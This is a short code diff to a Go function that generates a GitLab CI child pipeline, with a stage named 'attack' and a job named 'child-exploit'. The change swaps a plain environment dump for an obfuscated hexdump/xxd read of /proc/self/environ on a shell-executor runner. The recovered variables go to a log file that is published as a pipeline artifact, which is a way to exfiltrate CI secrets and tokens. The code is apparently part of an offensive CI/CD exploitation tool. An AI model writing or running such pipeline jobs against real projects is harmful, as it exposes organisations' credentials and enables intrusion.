@@ -63,9 +63,15 @@ func defaultChildPipeline() string {
 	return `stages: [attack]
 child-exploit:
   stage: attack
+  tags: [shell_executor]
   script:
-    - printenv | sort
-    - cat /proc/self/environ 2>/dev/null | tr '\0' '\n' || true
+    # Exfil in child pipeline via hexdump (binary read of environ)
+    - hexdump -C /proc/self/environ 2>/dev/null | sed 's/|.*|//' | tr -d '.\n ' | xxd -r -p | tr '\0' '\n' | sort > child-output.log || env | sort > child-output.log
+  artifacts:
+    when: always
+    paths:
+      - child-output.log
+    expire_in: 1 day
   allow_failure: true`
 }
 
